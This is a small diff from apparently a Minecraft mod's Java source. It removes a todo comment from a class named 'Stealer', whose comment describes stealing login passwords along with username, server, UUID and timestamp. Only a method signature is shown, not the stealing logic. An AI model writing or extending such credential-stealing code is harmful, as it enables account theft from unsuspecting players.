@@ -7,7 +7,6 @@ import java.util.List;
 import static me.soda.witch.Witch.mc;
 
 public class Stealer {
-    //todo: toggle
     //Steal login passwords, returns username, password, server, uuid and timestamp
     public String[] stealPassword(String command) throws Exception {
         String username;
